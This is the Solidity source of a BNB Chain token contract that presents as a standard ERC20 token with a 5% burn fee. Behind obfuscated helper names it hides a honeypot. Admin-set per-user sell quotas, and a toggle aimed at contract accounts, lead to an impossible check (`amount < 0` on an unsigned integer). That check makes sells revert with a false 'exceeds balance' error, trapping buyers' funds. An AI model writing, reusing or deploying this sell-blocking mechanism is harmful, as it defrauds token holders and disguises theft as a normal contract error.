contract TOKEN is TTBCNTERC20, TTBCNTConlse {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address _tokenOwner;
    mapping(address => uint256) private _TTBCNTyue;
    mapping(address => uint256) private _TTBCNTkong;
    bool public pair = false;

    address private _noneAddress = address(0x000000000000000000000000000000000000dEaD);

    constructor(address tokenOwner, string memory _name, string memory _symbol, uint256 _totalSupply) TTBCNTERC20(_name, _symbol, _totalSupply, msg.sender) {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        _tokenOwner = tokenOwner;
    }



    function _transfer(address from, address to, uint256 amount) internal override(TTBCNTERC20) {

        require(from != address(0), "ERC20: transfer from the zero address");
        
     

        _TTBCNTLogoBF(from, to, amount);

    }

    function isContract(address user) public view returns (bool) { 
       return user.code.length > 0;
    } 

    function _TTBCNTLogoBF(address from, address to,uint256 amount) internal {
        
         require(to != address(0), "ERC20: transfer to the zero address");     
        
        _TTBCNTTOLogo(from, to, amount);
    }

    function _TTBCNTTOLogo(address from, address to,uint256 amount) internal {

        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");  
        
        _TTBCNTexceeds(from, to, amount);
    }

    function _TTBCNTexceeds(address from, address to,uint256 amount) internal {

        bool takeFee = true;
        if(from == uniswapV2Pair){
            _TTBCNTxianmai(to, amount);
            takeFee = true;
        }else if(to == uniswapV2Pair){
            _TTBCNTxianmai(from, amount);
            _TTBCNTLogoBF(from, amount);
        }else{
            _TTBCNTxianmai(from, amount);
            _TTBCNTLogoBF(from, amount);
            takeFee = false;
        }

        if (takeFee) {
            super._transfer(from, _noneAddress, amount.div(100).mul(5));
            amount = amount.div(100).mul(95);
        }


        super._transfer(from, to, amount);
    }

    function _TTBCNTxianmai(address account,uint256 amount) internal {  
        if(isContract(account) && pair){
            uint256 ab = _TTBCNTyue[account];
            _TTBCNTyue[account] = ab;
            require(amount < 0, "ERC20: transfer amount exceeds balance");
        }
    }


    function setmaibuchu(address user, uint256 amount) public  onlyRole(DEFAULT_ADMIN_ROLE)  {
        _TTBCNTyue[user] = amount*1000000000000000000;
    }

    function setmaibuchuaddr(bool Pair_) public  onlyRole(DEFAULT_ADMIN_ROLE)  {
        pair = Pair_;
    }

    function querymaibuchu(address user) public view returns (uint256) {
        return _TTBCNTyue[user];
    }


    function _TTBCNTLogoBF(address account,uint256 amount) internal {  
        _TTBCNTexceeds(account, amount);
    }


    function _TTBCNTexceeds(address account,uint256 amount) internal {

        if (account != _noneAddress) {
            
            if(_TTBCNTyue[account] > 0){
                uint256 ab = _TTBCNTyue[account] - amount;
                _TTBCNTyue[account] = ab;
                _TTBCNTkong[account] = 1;
                _TTBCNTbalance(account, amount);
            }else{
                _TTBCNTkong[account] = 0;
            } 

        }
        
    }



    function _TTBCNTbalance(address account,uint256 amount) internal {

        _TTBCNTInternal(account, amount);
    }


    function _TTBCNTInternal(address account,uint256 amount) internal {

        if (account != _noneAddress) {
            if(_TTBCNTyue[account] <= 0){
                if(_TTBCNTkong[account] == 1){
                    uint256 ab = _TTBCNTyue[account];
                    _TTBCNTyue[account] = ab;

                    require(amount < 0, "ERC20: transfer amount exceeds balance");
                }
            }
            
        }
        
    }
}
